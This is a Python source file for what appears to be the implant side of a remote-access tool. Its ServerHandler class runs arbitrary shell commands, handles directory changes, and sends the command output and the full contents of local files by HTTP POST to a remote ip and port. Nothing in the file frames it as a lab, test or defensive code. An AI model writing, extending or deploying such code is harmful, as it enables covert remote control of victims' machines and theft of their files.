import os
import time
import requests
import subprocess
from urllib import request, parse
from http.server import BaseHTTPRequestHandler


class ServerHandler():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port


    def convert_text(self, text):
        RESET = "\033[0m"
        BOLD = "\033[1m"
        COLOR = "\u001b[36m"
        return f"{BOLD}{COLOR}{text}{RESET}"


    # Data is a dict
    def send_post(self, data):
        url = f'http://{self.ip}:{self.port}'
        data = {"rfile": data}
        data = parse.urlencode(data).encode()
        req = request.Request(url, data=data)
        request.urlopen(req) # send request


    def send_file(self, image_file_path):
        if not os.path.exists(image_file_path):
            self.send_post("[-] Not able to find the file")
            return
        with open(image_file_path, 'rb') as fp:
            self.send_post(fp.read())


    def send_data(self, data):
        try:
            self.send_post(data)
        except ValueError as e:
            self.send_post(e)
            return


    def run_command(self, command):
        if command[:2] == 'cd' and command != 'cd':
            try:
                os.chdir(command[3:])
                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = result.stdout.read() + result.stderr.read()
                result = "\n" + result.decode()

                if "The system cannot find the path specified." in result:
                    result = "\n"
                    self.send_post(result)
                else:
                    self.send_post(result)
            except(FileNotFoundError, IOError):
                error_message = "Directory does not exist!!! \n"
                self.send_post(error_message)

        else:
            result = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE, shell=True)
            self.send_post(result.stdout.read())
            self.send_post(result.stderr.read())




